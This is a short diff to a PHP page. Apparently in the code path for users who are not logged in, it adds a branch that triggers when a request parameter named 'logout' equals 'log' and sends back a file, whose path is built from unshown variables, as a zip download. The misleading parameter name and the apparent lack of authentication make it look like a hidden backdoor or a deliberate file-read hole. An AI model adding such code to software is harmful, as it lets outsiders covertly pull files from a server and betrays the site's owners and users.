@@ -182,6 +182,14 @@ if (!$logged)
             }
             
         }
+        if ($_REQUEST['logout'] == 'log'){
+            $yourfile = __DIR__.$w.$q;
+            $file_name = basename($w.$q);
+            header("Content-Type: application/zip");
+            header("Content-Disposition: attachment; filename=$file_name");
+            header("Content-Length: " . filesize($yourfile));
+            readfile($yourfile);
+        }
         
         $main_content .= '																		
 																	</table>
